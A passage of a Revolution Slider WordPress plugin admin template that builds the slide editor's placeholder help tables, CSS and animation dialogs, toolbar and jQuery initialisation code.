							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('featured_image_url_<?php echo $img_handle; ?>')">{{featured_image_url_<?php echo $img_handle; ?>}}</a></td><td><?php _e("Featured Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('featured_image_<?php echo $img_handle; ?>')">{{featured_image_<?php echo $img_handle; ?>}}</a></td><td><?php _e("Featured Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php if(RevSliderEventsManager::isEventsExists()){ ?>
						<br><br>
						
						<b><?php _e('Events Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
						<table class="table_template_help">
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_start_date')">{{event_start_date}}</a></td><td><?php _e("Event start date",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_end_date')">{{event_end_date}}</a></td><td><?php _e("Event end date",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_start_time')">{{event_start_time}}</a></td><td><?php _e("Event start time",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_end_time')">{{event_end_time}}</a></td><td><?php _e("Event end time",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_event_id')">{{event_event_id}}</a></td><td><?php _e("Event ID",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_name')">{{event_location_name}}</a></td><td><?php _e("Event location name",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_slug%')">{{event_location_slug}}</a></td><td><?php _e("Event location slug",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_address')">{{event_location_address}}</a></td><td><?php _e("Event location address",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_town')">{{event_location_town}}</a></td><td><?php _e("Event location town",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_state')">{{event_location_state}}</a></td><td><?php _e("Event location state",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_postcode')">{{event_location_postcode}}</a></td><td><?php _e("Event location postcode",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_region')">{{event_location_region}}</a></td><td><?php _e("Event location region",REVSLIDER_TEXTDOMAIN) ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('event_location_country')">{{event_location_country}}</a></td><td><?php _e("Event location country",REVSLIDER_TEXTDOMAIN) ?></td></tr>
						</table>
					<?php } ?>
					<?php
				break;
				case 'flickr':
					?>
					<b><?php _e('Flickr Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e("Post Title",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e("Post content",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e("The link to the post",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date')">{{date}}</a></td><td><?php _e("Date created",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e('Username',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('views')">{{views}}</a></td><td><?php _e('Views',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
				case 'instagram':
					?>
					<b><?php _e('Instagram Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e("Title",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e("Content",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e("Link",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date')">{{date}}</a></td><td><?php _e("Date created",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e('Username',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('likes')">{{likes}}</a></td><td><?php _e('Number of Likes',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('num_comments')">{{num_comments}}</a></td><td><?php _e('Number of Comments',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
				case 'twitter':
					?>
					<b><?php _e('Twitter Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e('Title',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e('Content',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e("Link",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_published')">{{date_published}}</a></td><td><?php _e('Pulbishing Date',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e('Username',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('retweet_count')">{{retweet_count}}</a></td><td><?php _e('Retweet Count',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('favorite_count')">{{favorite_count}}</a></td><td><?php _e('Favorite Count',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
				case 'facebook':
					?>
					<b><?php _e('Facebook Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e('Title',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e('Content',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e('Link',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_published')">{{date_published}}</a></td><td><?php _e('Pulbishing Date',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_published')">{{date_modified}}</a></td><td><?php _e('Last Modify Date',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e('Username',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('likes')">{{likes}}</a></td><td><?php _e('Number of Likes',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
				case 'youtube':
					?>
					<b><?php _e('YouTube Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e('Title',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('excerpt')">{{excerpt}}</a></td><td><?php _e('Excerpt',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e('Content',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_published')">{{date_published}}</a></td><td><?php _e('Pulbishing Date',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e('Link',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
				case 'vimeo':
					?>
					<b><?php _e('Vimeo Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e('Title',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('excerpt')">{{excerpt}}</a></td><td><?php _e('Excerpt',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e('Content',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e('The link to the post',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_published')">{{date_published}}</a></td><td><?php _e('Pulbishing Date',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e('Username',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('likes')">{{likes}}</a></td><td><?php _e('Number of Likes',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('views')">{{views}}</a></td><td><?php _e('Number of Views',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('num_comments')">{{num_comments}}</a></td><td><?php _e('Number of Comments',REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_url_<?php echo sanitize_title($img_handle); ?>')">{{image_url_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image URL",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<tr><td><a href="javascript:UniteLayersRev.insertTemplate('image_<?php echo sanitize_title($img_handle); ?>')">{{image_<?php echo sanitize_title($img_handle); ?>}}</a></td><td><?php _e("Image &lt;img /&gt;",REVSLIDER_TEXTDOMAIN); echo ' '.$img_name; ?></td></tr>
							<?php
						}
						?>
					</table>
					<?php
				break;
			}
			?>
		</div>

		<div id="dialog_advanced_css" class="dialog_advanced_css" title="<?php _e('Advanced CSS', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div style="display: none;"><span id="rev-example-style-layer">example</span></div>
			<div class="first-css-area">
				<span class="advanced-css-title" style="background:#e67e22"><?php _e('Style from Options', REVSLIDER_TEXTDOMAIN); ?><span style="margin-left:15px;font-size:11px;font-style:italic">(<?php _e('Editable via Option Fields, Saved in the Class:', REVSLIDER_TEXTDOMAIN); ?><span class="current-advance-edited-class"></span>)</span></span>
				<textarea id="textarea_template_css_editor_uneditable" rows="20" cols="81" disabled="disabled"></textarea>
			</div>
			<div class="second-css-area">
				<span class="advanced-css-title"><?php _e('Additional Custom Styling', REVSLIDER_TEXTDOMAIN); ?><span style="margin-left:15px;font-size:11px;font-style:italic">(<?php _e('Appended in the Class:', REVSLIDER_TEXTDOMAIN); ?><span class="current-advance-edited-class"></span>)</span></span>
				<textarea id="textarea_advanced_css_editor" rows="20" cols="81"></textarea>
			</div>
		</div>
		
		<div id="dialog_save_as_css" class="dialog_save_as_css" title="<?php _e('Save As', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div style="margin-top:14px">
				<span style="margin-right:15px"><?php _e('Save As:', REVSLIDER_TEXTDOMAIN); ?></span><input id="rs-save-as-css" type="text" name="rs-save-as-css" value="" />
			</div>
		</div>
		 
		<div id="dialog_rename_css" class="dialog_rename_css" title="<?php _e('Rename CSS', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div style="margin-top:14px">
				<span style="margin-right:15px"><?php _e('Rename to:', REVSLIDER_TEXTDOMAIN); ?></span><input id="rs-rename-css" type="text" name="rs-rename-css" value="" />
			</div>
		</div>
		 
		<div id="dialog_advanced_layer_css" class="dialog_advanced_layer_css" title="<?php _e('Layer Inline CSS', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div class="first-css-area">
				<span class="advanced-css-title" style="background:#e67e22"><?php _e('Advanced Custom Styling', REVSLIDER_TEXTDOMAIN); ?><span style="margin-left:15px;font-size:11px;font-style:italic">(<?php _e('Appended Inline to the Layer Markup', REVSLIDER_TEXTDOMAIN); ?>)</span></span>
				<textarea id="textarea_template_css_editor_layer" name="textarea_template_css_editor_layer"></textarea>
			</div>
		</div>
		
		<div id="dialog_save_as_animation" class="dialog_save_as_animation" title="<?php _e('Save As', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div style="margin-top:14px">
				<span style="margin-right:15px"><?php _e('Save As:', REVSLIDER_TEXTDOMAIN); ?></span><input id="rs-save-as-animation" type="text" name="rs-save-as-animation" value="" />
			</div>
		</div>
		
		<div id="dialog_save_animation" class="dialog_save_animation" title="<?php _e('Save Under', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
			<div style="margin-top:14px">
				<span style="margin-right:15px"><?php _e('Save Under:', REVSLIDER_TEXTDOMAIN); ?></span><input id="rs-save-under-animation" type="text" name="rs-save-under-animation" value="" />
			</div>
		</div>
		
		<script type="text/javascript">

			<?php
			$icon_sets = RevSliderBase::get_icon_sets();
			$sets = array();
			if(!empty($icon_sets)){
				$sets = implode("','", $icon_sets);
			}
			?>

			 var rs_icon_sets = new Array('<?php echo $sets; ?>');

			jQuery(document).ready(function() {
				<?php if(!empty($jsonLayers)){ ?>
					//set init layers object
					UniteLayersRev.setInitLayersJson(<?php echo $jsonLayers?>);
				<?php } ?>

				<?php
				if($slide->isStaticSlide()){
					$arrayDemoLayers = array();
					$arrayDemoSettings = array();
					if(!empty($all_slides) && is_array($all_slides)){
						foreach($all_slides as $cSlide){
							$arrayDemoLayers[$cSlide->getID()] = $cSlide->getLayers();
							$arrayDemoSettings[$cSlide->getID()] = $cSlide->getParams();
						}
					}
					$jsonDemoLayers = RevSliderFunctions::jsonEncodeForClientSide($arrayDemoLayers);
					$jsonDemoSettings = RevSliderFunctions::jsonEncodeForClientSide($arrayDemoSettings);
					?>
					//set init demo layers object
					UniteLayersRev.setInitDemoLayersJson(<?php echo $jsonDemoLayers; ?>);
					UniteLayersRev.setInitDemoSettingsJson(<?php echo $jsonDemoSettings; ?>);
					<?php
				} ?>

				<?php if(!empty($jsonCaptions)){ ?>
				UniteLayersRev.setInitCaptionClasses(<?php echo $jsonCaptions; ?>);
				<?php } ?>

				<?php if(!empty($arrCustomAnim)){ ?>
				UniteLayersRev.setInitLayerAnim(<?php echo $arrCustomAnim; ?>);
				<?php } ?>

				<?php if(!empty($arrCustomAnimDefault)){ ?>
				UniteLayersRev.setInitLayerAnimsDefault(<?php echo $arrCustomAnimDefault; ?>);
				<?php } ?>

				<?php if(!empty($jsonFontFamilys)){ ?>
				UniteLayersRev.setInitFontTypes(<?php echo $jsonFontFamilys; ?>);
				<?php } ?>

				<?php if(!empty($arrCssStyles)){ ?>
				UniteCssEditorRev.setInitCssStyles(<?php echo $arrCssStyles; ?>);
				<?php } ?>

				<?php
				$trans_sizes = RevSliderFunctions::jsonEncodeForClientSide($slide->translateIntoSizes());
				?>
				UniteLayersRev.setInitTransSetting(<?php echo $trans_sizes; ?>);

				UniteLayersRev.init("<?php echo $slideDelay; ?>");

				UniteCssEditorRev.init();

				RevSliderAdmin.initGlobalStyles();

				RevSliderAdmin.initLayerPreview();

				RevSliderAdmin.setStaticCssCaptionsUrl('<?php echo RevSliderGlobals::$urlStaticCaptionsCSS; ?>');

				/* var reproduce;
				jQuery(window).resize(function() {
					clearTimeout(reproduce);
					reproduce = setTimeout(function() {
						UniteLayersRev.refreshGridSize();
					},100);
				});*/

				<?php if($kenburn_effect == 'on'){ ?>
				jQuery('input[name="kenburn_effect"]:checked').change();
				<?php } ?>


				// DRAW  HORIZONTAL AND VERTICAL LINEAR
				var horl = jQuery('#hor-css-linear .linear-texts'),
					verl = jQuery('#ver-css-linear .linear-texts'),
					maintimer = jQuery('#mastertimer-linear .linear-texts'),
					mw = "<?php echo $tempwidth_jq; ?>";
					mw = parseInt(mw.split(":")[1],0);

				for (var i=-600;i<mw;i=i+100) {
					if (mw-i<100)
						horl.append('<li style="width:'+(mw-i)+'px"><span>'+i+'</span></li>');
					else
						horl.append('<li><span>'+i+'</span></li>');
				}

				for (var i=0;i<2000;i=i+100) {
					verl.append('<li><span>'+i+'</span></li>');
				}

				for (var i=0;i<160;i=i+1) {
					var txt = i+"s";

					maintimer.append('<li><span>'+txt+'</span></li>');
				}

				// SHIFT RULERS and TEXTS and HELP LINES//
				function horRuler() {
					var dl = jQuery('#divLayers'),
						l = parseInt(dl.offset().left,0) - parseInt(jQuery('#thelayer-editor-wrapper').offset().left,0);
					jQuery('#hor-css-linear').css({backgroundPosition:(l)+"px 50%"});
					jQuery('#hor-css-linear .linear-texts').css({left:(l-595)+"px"});
					jQuery('#hor-css-linear .helplines-offsetcontainer').css({left:(l)+"px"});

					jQuery('#ver-css-linear .helplines').css({left:"-15px"}).width(jQuery('#thelayer-editor-wrapper').outerWidth(true)-35);
					jQuery('#hor-css-linear .helplines').css({top:"-15px"}).height(jQuery('#thelayer-editor-wrapper').outerHeight(true)-41);
				}

				horRuler();


				jQuery('.my-color-field').wpColorPicker({
					palettes:false,
					height:250,

					border:false,
				    change:function(event,ui) {
				    	switch (jQuery(event.target).attr('name')) {
							case "adbutton-color-1":
							case "adbutton-color-2":
							case "adbutton-border-color":
								setExampleButtons();
							break;

							case "adshape-color-1":
							case "adshape-color-2":
							case "adshape-border-color":							
								setExampleShape();
							break;
							case "bg_color":
								var bgColor = jQuery("#slide_bg_color").val();
								jQuery("#divbgholder").css("background-color",bgColor);
								jQuery('.slotholder .tp-bgimg.defaultimg').css({backgroundColor:bgColor});
							break;
						}		

						if (jQuery('.layer_selected.slide_layer').length>0) {
							jQuery(event.target).blur().focus();
							//jQuery('#style_form_wrapper').trigger("colorchanged");
						}

					},
					clear:function(event,ui) {
						if (jQuery('.layer_selected.slide_layer').length>0) {
							var inp = jQuery(event.target).closest('.wp-picker-input-wrap').find('.my-color-field');
							inp.val("transparent").blur().focus();
							//jQuery('#style_form_wrapper').trigger("colorchanged");
						}
					}
								
				});

				jQuery('.adb-input').on("change blur focus",setExampleButtons);
				jQuery('.ads-input, input[name="shape_fullwidth"], input[name="shape_fullheight"]').on("change blur focus",setExampleShape);
				jQuery('.ui-autocomplete').on('click',setExampleButtons);

				jQuery('.wp-color-result').on("click",function() {

					if (jQuery(this).hasClass("wp-picker-open"))
						jQuery(this).closest('.wp-picker-container').addClass("pickerisopen");
					else
						jQuery(this).closest('.wp-picker-container').removeClass("pickerisopen");
				});

				jQuery("body").click(function(event) {
					jQuery('.wp-picker-container.pickerisopen').removeClass("pickerisopen");
				})

				// WINDOW RESIZE AND SCROLL EVENT SHOULD REDRAW RULERS
				jQuery(window).resize(horRuler);
				jQuery('#divLayers-wrapper').on('scroll',horRuler);


				jQuery('#toggle-idle-hover .icon-stylehover').click(function() {
					var bt = jQuery('#toggle-idle-hover');
					bt.removeClass("idleisselected").addClass("hoverisselected");
					jQuery('#tp-idle-state-advanced-style').hide();
					jQuery('#tp-hover-state-advanced-style').show();
				});

				jQuery('#toggle-idle-hover .icon-styleidle').click(function() {
					var bt = jQuery('#toggle-idle-hover');
					bt.addClass("idleisselected").removeClass("hoverisselected");
					jQuery('#tp-idle-state-advanced-style').show();
					jQuery('#tp-hover-state-advanced-style').hide();
				});


				jQuery('input[name="hover_allow"]').on("change",function() {
					if (jQuery(this).attr("checked")=="checked") {
						jQuery('#idle-hover-swapper').show();
					} else {
						jQuery('#idle-hover-swapper').hide();
					}
				});


				// HIDE /SHOW  INNER SAVE,SAVE AS ETC..
				jQuery('.clicktoshowmoresub').click(function() {
					jQuery(this).find('.clicktoshowmoresub_inner').show();
				});

				jQuery('.clicktoshowmoresub').on('mouseleave',function() {
					jQuery(this).find('.clicktoshowmoresub_inner').hide();
				});
				
				//arrowRepeater();
				function arrowRepeater() {
					var tw = new punchgs.TimelineLite();
					tw.add(punchgs.TweenLite.from(jQuery('.animatemyarrow'),0.5,{x:-10,opacity:0}),0);
					tw.add(punchgs.TweenLite.to(jQuery('.animatemyarrow'),0.5,{x:10,opacity:0}),0.5);
					
					tw.play(0);
					tw.eventCallback("onComplete",function() {
						tw.restart();
					})
				}
				
				RevSliderSettings.createModernOnOff();

			});

		</script>

	

		<?php
		if(!$slide->isStaticSlide()){
		?>
<!--			<a href="javascript:void(0)" id="button_save_slide" class="revgreen button-primary"><div class="updateicon"></div><i class="rs-icon-save-light" style="display: inline-block;vertical-align: middle;width: 18px;height: 20px;background-repeat: no-repeat;margin-right:5px;"></i><?php _e("Save Slide",REVSLIDER_TEXTDOMAIN); ?></a>

-->
		<?php }else{ ?>
<!--			<a href="javascript:void(0)" id="button_save_static_slide" class="revgreen button-primary"><div class="updateicon"></div><i class="revicon-arrows-ccw"></i><?php _e("Update Static Layers",REVSLIDER_TEXTDOMAIN); ?></a>

-->
		<?php } ?>
<!--		<span id="loader_update" class="loader_round" style="display:none;"><?php _e("updating",REVSLIDER_TEXTDOMAIN); ?>...</span>
		<span id="update_slide_success" class="success_message" class="display:none;"></span>
		<a href="<?php echo self::getViewUrl(RevSliderAdmin::VIEW_SLIDER,"id=$sliderID"); ?>" class="button-primary revblue"><i class="revicon-cog"></i><?php _e("Slider Settings",REVSLIDER_TEXTDOMAIN); ?></a>
		<a id="button_close_slide" href="<?php echo $closeUrl?>" class="button-primary revyellow"><div class="closeicon"></div><i class="revicon-list-add"></i><?php _e("Slides Overview",REVSLIDER_TEXTDOMAIN); ?></a>
-->
		<?php
		if(!$slide->isStaticSlide()){
		?>
<!--		<a href="javascript:void(0)" id="button_delete_slide" class="button-primary revred" original-title=""><i class="revicon-trash"></i><?php _e("Delete Slide",REVSLIDER_TEXTDOMAIN); ?></a>
	-->
		<?php } ?>
	</div>

<div class="vert_sap"></div>

<!-- FIXED TOOLBAR ON THE RIGHT SIDE -->
<div class="rs-mini-toolbar">
	<?php
	if(!$slide->isStaticSlide()){
		$savebtnid="button_save_slide-tb";
		$prevbtn = "button_preview_slide-tb";
		if($slider->isSlidesFromPosts()){
			$prevbtn = "button_preview_slider-tb";
		}
	}else{
		$savebtnid="button_save_static_slide-tb";
		$prevbtn = "button_preview_slider-tb";
	}
	?>
	<div class="rs-toolbar-savebtn">
		<a class='button-primary revgreen' href='javascript:void(0)' id="<?php echo $savebtnid; ?>" ><i class="rs-icon-save-light" style="display: inline-block;vertical-align: middle;width: 18px;height: 20px;background-repeat: no-repeat;"></i><?php _e("Save Slide",REVSLIDER_TEXTDOMAIN); ?></a>
	</div>
	
	<div class="rs-toolbar-cssbtn">
		<a class='button-primary revpurple' href='javascript:void(0)' id='button_edit_css_global'><i class="">&lt;/&gt;</i><?php _e("CSS Global",REVSLIDER_TEXTDOMAIN); ?></a>
	</div>


	<div class="rs-toolbar-slides">
		<?php
		$slider_url = ($sliderTemplate == 'true') ? RevSliderAdmin::VIEW_SLIDER_TEMPLATE : RevSliderAdmin::VIEW_SLIDER;
		?>
		<a class="button-primary revblue" href="<?php echo self::getViewUrl($slider_url,"id=$sliderID"); ?>" id="link_edit_slides_t"><i class="revicon-cog"></i><?php _e("Slider Settings",REVSLIDER_TEXTDOMAIN); ?> </a>
		
	</div>
	<div class="rs-toolbar-preview">
		<a class="button-primary revgray" href="javascript:void(0)"  id="<?php echo $prevbtn; ?>" ><i class="revicon-search-1"></i><?php _e("Preview",REVSLIDER_TEXTDOMAIN); ?></a>
	</div>
	
</div>


<div id="dialog_rename_animation" class="dialog_rename_animation" title="<?php _e('Rename Animation', REVSLIDER_TEXTDOMAIN); ?>" style="display:none;">
	<div style="margin-top:14px">
		<span style="margin-right:15px"><?php _e('Rename to:', REVSLIDER_TEXTDOMAIN); ?></span><input id="rs-rename-animation" type="text" name="rs-rename-animation" value="" />
	</div>
</div>

<?php
if($slide->isStaticSlide()){
	$slideID = $slide->getID();
}

$mslide_list = array();
foreach($arrSlides as $at_slide) {
	$mslID = $at_slide->getID();
	if($mslID == $slideID) continue;
	
	$mslide_list[] = array($mslID => $at_slide->getParam('title', 'Slide'));
}
$mslide_list = RevSliderFunctions::jsonEncodeForClientSide($mslide_list);

?>
<script type="text/javascript">
	var g_patternViewSlide = '<?php echo $patternViewSlide; ?>';

	
	var g_messageDeleteSlide = "<?php _e("Delete this slide?",REVSLIDER_TEXTDOMAIN); ?>";
	jQuery(document).ready(function(){
		RevSliderAdmin.initEditSlideView(<?php echo $slideID; ?>, <?php echo $sliderID; ?>, <?php echo ($slide->isStaticSlide()) ? 'true' : 'false'; ?>);
		
		UniteLayersRev.setInitSlideIds(<?php echo $mslide_list; ?>);
	});
	var curSlideID = <?php echo $slideID; ?>;
</script>

<?php
